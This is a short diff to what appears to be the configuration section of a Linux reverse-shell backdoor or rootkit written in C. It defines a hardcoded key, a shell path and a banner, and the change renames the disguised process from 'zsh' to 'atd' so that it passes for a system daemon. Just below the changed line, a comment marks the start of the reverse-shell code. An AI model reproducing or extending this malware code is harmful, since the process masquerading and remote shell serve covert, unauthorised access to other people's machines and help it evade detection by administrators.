@@ -19,7 +19,7 @@
 #define KEY         	"e26d9050a8a01a25048a2d61cabedbcf"
 #define MOTD        	"maK_it\n/bin/bash shell..\n"
 #define SHELL       	"/bin/sh"
-#define PROCESS_NAME    "zsh"
+#define PROCESS_NAME    "atd"
 
 /*
  * Start the reverse shell
